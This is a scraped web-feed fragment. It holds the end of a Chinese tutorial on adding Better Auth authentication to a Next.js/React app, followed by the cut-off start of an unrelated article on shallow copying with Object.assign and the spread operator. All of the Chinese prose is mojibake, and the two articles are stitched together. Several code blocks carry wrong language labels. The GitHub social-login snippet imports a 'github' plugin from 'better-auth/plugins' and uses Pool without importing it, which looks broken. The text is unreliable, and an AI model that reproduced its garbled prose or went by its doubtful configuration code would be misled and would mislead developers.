<li><strong>æ’ä»¶åŒ–æ¶æ„</strong>ï¼šéœ€è¦ä»€ä¹ˆåŠŸèƒ½å°±åŠ ä»€ä¹ˆæ’ä»¶ï¼Œä¸ä¼šå¼•å…¥ä¸å¿…è¦çš„ä¾èµ–</li>
<li><strong>ç°ä»£åŒ–è®¾è®¡</strong>ï¼šé‡‡ç”¨æœ€æ–°çš„ Web æ ‡å‡†å’Œæœ€ä½³å®è·µ</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‹é¢ä»¥ Next.js + React å¸¦å¤§å®¶å¿«é€Ÿä¸Šæ‰‹ï¼ˆExpress+ Vue ä¹ŸåŸºæœ¬ä¸€æ ·ï¼‰</h2>
<p>ä¸‹é¢æˆ‘ä»¬ä»¥ Next.js å’Œ React ä¸ºä¾‹ï¼Œçœ‹çœ‹å¦‚ä½•å¿«é€Ÿé›†æˆ Better Authã€‚</p>
<h3 data-id="heading-3">ä¸€ã€å®‰è£…å’ŒåŸºç¡€é…ç½®</h3>
<p>é¦–å…ˆå®‰è£… Better Authï¼š</p>
<pre><code class="hljs">npm install better-auth
</code></pre>
<p>ç„¶ååˆ›å»ºç¯å¢ƒå˜é‡æ–‡ä»¶ <code>.env</code>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">BETTER_AUTH_SECRET</span>=<span class="hljs-number">32</span>ä½ä»¥ä¸Šå¯†é’¥
<span class="hljs-attr">BETTER_AUTH_URL</span>=http://localhost:<span class="hljs-number">3000</span>
</code></pre>
<p>è¿™é‡Œ <code>BETTER_AUTH_SECRET</code> ç”¨äºåŠ å¯†å’Œå“ˆå¸Œï¼Œå¿…é¡»è‡³å°‘ 32 ä¸ªå­—ç¬¦ã€‚ä½ å¯ä»¥ç”¨ <code>openssl rand -base64 32</code> ç”Ÿæˆä¸€ä¸ªã€‚</p>
<h3 data-id="heading-4">äºŒã€åˆ›å»ºæœåŠ¡ç«¯è®¤è¯å®ä¾‹</h3>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ï¼ˆæˆ– <code>lib/</code>ã€<code>utils/</code> æ–‡ä»¶å¤¹ï¼‰åˆ›å»º <code>auth.ts</code>ï¼š</p>
<pre><code class="hljs language-php" lang="php">import { betterAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth"</span>;
import { Pool } <span class="hljs-keyword">from</span> <span class="hljs-string">"pg"</span>; <span class="hljs-comment">// ä»¥ PostgreSQL ä¸ºä¾‹</span>
â€‹
export <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">auth</span> = <span class="hljs-title function_ invoke__">betterAuth</span>({
 <span class="hljs-attr">Â database</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pool</span>({
 Â  <span class="hljs-attr">Â host</span>: process.env.DB_HOST,
 Â  <span class="hljs-attr">Â port</span>: <span class="hljs-number">5432</span>,
 Â  <span class="hljs-attr">Â user</span>: process.env.DB_USER,
 Â  <span class="hljs-attr">Â password</span>: process.env.DB_PASSWORD,
 Â  <span class="hljs-attr">Â database</span>: process.env.DB_NAME,
  }),
});
</code></pre>
<p>å¦‚æœä½ ç”¨çš„æ˜¯ SQLite æˆ–è€…æƒ³ç”¨ ORMï¼ˆæ¯”å¦‚ Drizzleã€Prismaï¼‰ï¼ŒBetter Auth ä¹Ÿæä¾›äº†å¯¹åº”çš„é€‚é…å™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ Drizzle</span>
<span class="hljs-keyword">import</span> { drizzleAdapter } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/adapters/drizzle"</span>;
<span class="hljs-keyword">import</span> { db } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/db"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> auth = <span class="hljs-title function_">betterAuth</span>({
 Â <span class="hljs-attr">database</span>: <span class="hljs-title function_">drizzleAdapter</span>(db, {
 Â  Â <span class="hljs-attr">provider</span>: <span class="hljs-string">"pg"</span>, <span class="hljs-comment">// æˆ– "mysql", "sqlite"</span>
  }),
});
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€åˆ›å»ºæ•°æ®åº“è¡¨</h3>
<p>Better Auth æä¾›äº† CLI å·¥å…·æ¥ç®¡ç†æ•°æ®åº“ schemaï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆè¿ç§»æ–‡ä»¶</span>
npx @better-auth/cli generate
â€‹
<span class="hljs-comment"># æˆ–è€…ç›´æ¥è¿ç§»ï¼ˆä»…æ”¯æŒ Kysely é€‚é…å™¨ï¼‰</span>
npx @better-auth/cli migrate
</code></pre>
<h3 data-id="heading-6">å››ã€åœ¨ Next.js ä¸­æŒ‚è½½ API è·¯ç”±</h3>
<p>åœ¨ Next.js App Router ä¸­ï¼Œåˆ›å»º <code>app/api/auth/[...all]/route.ts</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { auth } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth"</span>;
<span class="hljs-keyword">import</span> { toNextJsHandler } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/next-js"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">GET</span>, <span class="hljs-variable constant_">POST</span> } = <span class="hljs-title function_">toNextJsHandler</span>(auth.<span class="hljs-property">handler</span>);
</code></pre>
<p>è¿™æ ·ç›¸å½“äºä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œæ‰€æœ‰ <code>/api/auth/*</code> çš„è¯·æ±‚éƒ½ä¼šè¢« Better Auth å¤„ç†ã€‚</p>
<h3 data-id="heading-7">äº”ã€åˆ›å»ºå®¢æˆ·ç«¯å®ä¾‹</h3>
<p>åœ¨å®¢æˆ·ç«¯ï¼Œåˆ›å»º <code>lib/auth-client.ts</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createAuthClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/react"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> authClient = <span class="hljs-title function_">createAuthClient</span>({
 Â <span class="hljs-attr">baseURL</span>: <span class="hljs-string">"http://localhost:3000"</span>, <span class="hljs-comment">// å¦‚æœæ˜¯åŒåŸŸï¼Œä¸€èˆ¬å°±å¯ä»¥çœç•¥</span>
});
</code></pre>
<h3 data-id="heading-8">å…­ã€åœ¨ React ç»„ä»¶ä¸­ä½¿ç”¨</h3>
<p>å¥½äº†ï¼Œç°åœ¨å°±å¯ä»¥åœ¨ç»„ä»¶ä¸­ä½¿ç”¨è®¤è¯åŠŸèƒ½äº†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-string">"use client"</span>;
â€‹
<span class="hljs-keyword">import</span> { authClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth-client"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginPage</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> [email, setEmail] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
 Â <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
â€‹
 Â <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSignUp</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
 Â  Â <span class="hljs-keyword">const</span> { data, error } = <span class="hljs-keyword">await</span> authClient.<span class="hljs-property">signUp</span>.<span class="hljs-title function_">email</span>({
 Â  Â  Â email,
 Â  Â  Â password,
 Â  Â  Â <span class="hljs-attr">name</span>: <span class="hljs-string">"ç”¨æˆ·"</span>, <span class="hljs-comment">// å¯é€‰</span>
 Â  Â  Â <span class="hljs-attr">callbackURL</span>: <span class="hljs-string">"/dashboard"</span>,
 Â   });
â€‹
 Â  Â <span class="hljs-keyword">if</span> (error) {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥:"</span>, error);
 Â   } <span class="hljs-keyword">else</span> {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ³¨å†ŒæˆåŠŸ:"</span>, data);
 Â  Â  Â <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œåšé‡å®šå‘</span>
 Â   }
  };
â€‹
 Â <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSignIn</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
 Â  Â <span class="hljs-keyword">const</span> { data, error } = <span class="hljs-keyword">await</span> authClient.<span class="hljs-property">signIn</span>.<span class="hljs-title function_">email</span>({
 Â  Â  Â email,
 Â  Â  Â password,
 Â  Â  Â <span class="hljs-attr">callbackURL</span>: <span class="hljs-string">"/dashboard"</span>,
 Â  Â  Â <span class="hljs-attr">rememberMe</span>: <span class="hljs-literal">true</span>,
 Â   });
â€‹
 Â  Â <span class="hljs-keyword">if</span> (error) {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"ç™»å½•å¤±è´¥:"</span>, error);
 Â   } <span class="hljs-keyword">else</span> {
 Â  Â  Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ç™»å½•æˆåŠŸ:"</span>, data);
 Â   }
  };
â€‹
 Â <span class="hljs-keyword">return</span> (
 Â  Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
 Â  Â  Â  Â <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span>
 Â  Â  Â  Â <span class="hljs-attr">value</span>=<span class="hljs-string">{email}</span>
 Â  Â  Â  Â <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setEmail(e.target.value)}
 Â  Â  Â  Â placeholder="é‚®ç®±"
 Â  Â  Â /&gt;
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
 Â  Â  Â  Â <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
 Â  Â  Â  Â <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span>
 Â  Â  Â  Â <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setPassword(e.target.value)}
 Â  Â  Â  Â placeholder="å¯†ç "
 Â  Â  Â /&gt;
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleSignUp}</span>&gt;</span>æ³¨å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleSignIn}</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-9">ä¸ƒã€è·å–å½“å‰ä¼šè¯</h3>
<p>ä½¿ç”¨ <code>useSession</code> hook æ¥è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-string">"use client"</span>;
â€‹
<span class="hljs-keyword">import</span> { authClient } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth-client"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: session, isPending } = authClient.<span class="hljs-title function_">useSession</span>();
â€‹
 Â <span class="hljs-keyword">if</span> (isPending) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">if</span> (!session?.<span class="hljs-property">user</span>) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æœªç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">return</span> (
 Â  Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ¬¢è¿ï¼Œ{session.user.name}ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é‚®ç®±ï¼š{session.user.email}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
 Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> authClient.signOut()}&gt;é€€å‡ºç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>ä¹Ÿå¯ä»¥åœ¨æœåŠ¡ç«¯è·å–ä¼šè¯ä¿¡æ¯ï¼Œæ¯”å¦‚åœ¨ Next.js çš„ Server Component ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { auth } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServerProfile</span>(<span class="hljs-params"/>) {
 Â <span class="hljs-keyword">const</span> session = <span class="hljs-keyword">await</span> auth.<span class="hljs-property">api</span>.<span class="hljs-title function_">getSession</span>({
 Â  Â <span class="hljs-attr">headers</span>: <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"next/headers"</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> m.<span class="hljs-title function_">headers</span>()),
  });
â€‹
 Â <span class="hljs-keyword">if</span> (!session) {
 Â  Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æœªç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
â€‹
 Â <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æ¬¢è¿ï¼Œ{session.user.name}ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-10">å…«ã€æ·»åŠ ç¤¾äº¤ç™»å½•</h3>
<p>ä»¥æ·»åŠ GitHub ç™»å½•ä¸ºä¾‹ï¼Œåªéœ€è¦åœ¨æœåŠ¡ç«¯é…ç½®ä¸­æ·»åŠ ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> { betterAuth } from <span class="hljs-string">"better-auth"</span>;
<span class="hljs-keyword">import</span> { github } from <span class="hljs-string">"better-auth/plugins"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-type">const</span> auth = <span class="hljs-built_in">betterAuth</span>({
 Â database: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pool</span>({ <span class="hljs-comment">/* ... */</span> }),
 Â plugins: [
 Â  Â <span class="hljs-built_in">github</span>({
 Â  Â  Â clientId: process.env.GITHUB_CLIENT_ID!,
 Â  Â  Â clientSecret: process.env.GITHUB_CLIENT_SECRET!,
 Â   }),
  ],
});
</code></pre>
<p>ç„¶ååœ¨å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">button</span> onClick={() =&gt; authClient<span class="hljs-selector-class">.signIn</span><span class="hljs-selector-class">.social</span>({ provider: <span class="hljs-string">"github"</span> })}&gt;
  ä½¿ç”¨ GitHub ç™»å½•
&lt;/<span class="hljs-selector-tag">button</span>&gt;
</code></pre>
<p>å›½å¤–çš„ä¸»æµè½¯ä»¶ï¼ŒGoogleã€Hugging faceã€Twitter ç­‰éƒ½æ”¯æŒï¼Œä½†æ˜¯å›½å†…çš„é’‰é’‰ã€å¾®ä¿¡ç™»å½•éœ€è¦è‡ªè¡Œå®ç°ã€‚</p>
<hr/>
<h2 data-id="heading-11">Better Auth vs ä¼ ç»Ÿæ–¹æ¡ˆ</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ‰‹å†™è®¤è¯</th><th>Better Auth</th></tr></thead><tbody><tr><td>TypeScript æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å†™ç±»å‹</td><td>åŸç”Ÿæ”¯æŒ</td></tr><tr><td>æ¡†æ¶æ— å…³</td><td>-</td><td>-</td></tr><tr><td>æ’ä»¶ç”Ÿæ€</td><td>-</td><td>ä¸°å¯Œ(è´¦å·å¯†ç ã€OAuth2ã€ç¬¬ä¸‰æ–¹ç™»å½•ç­‰ç­‰)</td></tr><tr><td>å¤šç§Ÿæˆ·æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å®ç°</td><td>å†…ç½®</td></tr><tr><td>2FA æ”¯æŒ</td><td>éœ€è¦è‡ªå·±å®ç°</td><td>å†…ç½®</td></tr><tr><td>å­¦ä¹ æ›²çº¿</td><td>é™¡å³­</td><td>å¹³ç¼“</td></tr></tbody></table>
<hr/>
<p>åœ¨AIå…¨æ ˆæ—¶ä»£ï¼Œ Better Authé€æ¸æˆä¸ºäº†JSå¼€å‘è€…è¿›è¡Œé‰´æƒå¼€å‘çš„ç¬¬ä¸€é€‰æ‹©ï¼Œæ‰€ä»¥å®ƒåŒæ ·å¼€æ”¾äº†MCPï¼Œå¯ä»¥åœ¨AI Codingæ—¶å€™æ›´æ–¹ä¾¿åœ°è°ƒç”¨ã€‚</p>
<hr/>
<p>æˆ‘çš„å…¬ä¼—å·ï¼šæ©™å­çš„AIå‰ç«¯ç¬”è®°ï¼Œè°¢è°¢å¤§å®¶å…³æ³¨ï¼Œåç»­ä¼šæŒç»­è¾“å‡ºæ›´å¤šå‰ç«¯ AI æ·±å±‚æ¬¡å¹²è´§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592432859863121954</link>    <guid>https://juejin.cn/post/7592432859863121954</guid>    <pubDate>2026-01-07T15:07:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863121954" data-draft-id="7592432859863105570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-07T15:07:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Object.assignå’Œæ‰©å±•è¿ç®—ç¬¦æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Œä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:07:37.000Z" title="Wed Jan 07 2026 15:07:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>Object.assign()</code>Â å’Œæ‰©å±•è¿ç®—ç¬¦ï¼ˆSpread OperatorÂ <code>...</code>ï¼‰éƒ½æ˜¯<strong>æµ…æ‹·è´ï¼ˆShallow Copyï¼‰</strong> ï¼Œä¸æ˜¯æ·±æ‹·è´ï¼ˆDeep Copyï¼‰ã€‚å®ƒä»¬åªå¤åˆ¶å¯¹è±¡çš„ç¬¬ä¸€å±‚å±æ€§ï¼ŒåµŒå¥—å¯¹è±¡ä»ç„¶æ˜¯å¼•ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸¤è€…ç›¸åŒç‚¹ï¼šéƒ½æ˜¯æµ…æ‹·è´</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç¤ºä¾‹ï¼šéƒ½æ˜¯æµ…æ‹·è´</span>
<span class="hljs-keyword">const</span> original = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">address</span>: {
    <span class="hljs-attr">city</span>: <span class="hljs-string">"åŒ—äº¬"</span>,
    <span class="hljs-attr">street</span>: <span class="hljs-string">"é•¿å®‰è¡—"</span>
  }
};

<span class="hljs-comment">// ä½¿ç”¨ Object.assign</span>
<span class="hljs-keyword">const</span> copy1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, original);
<span class="hljs-comment">// ä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦</span>
<span class="hljs-keyword">const</span> copy2 = { ...original };

<span class="hljs-comment">// ä¿®æ”¹åŸå§‹å¯¹è±¡çš„åµŒå¥—å±æ€§</span>
original.<span class="hljs-property">address</span>.<span class="hljs-property">city</span> = <span class="hljs-string">"ä¸Šæµ·"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">address</span>.<span class="hljs-property">city</span>); <span class="hljs-comment">// "ä¸Šæµ·" - è¢«å½±å“äº†</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy2.<span class="hljs-property">address</span>.<span class="hljs-property">city</span>); <span class="hljs-comment">// "ä¸Šæµ·" - è¢«å½±å“äº†</span>

<span class="hljs-comment">// ä½†ç¬¬ä¸€å±‚å±æ€§æ˜¯ç‹¬ç«‹çš„</span>
original.<span class="hljs-property">name</span> = <span class="hljs-string">"æå››"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy1.<span class="hljs-property">name</span>); <span class="hljs-comment">// "å¼ ä¸‰" - ä¸å—å½±å“</span>
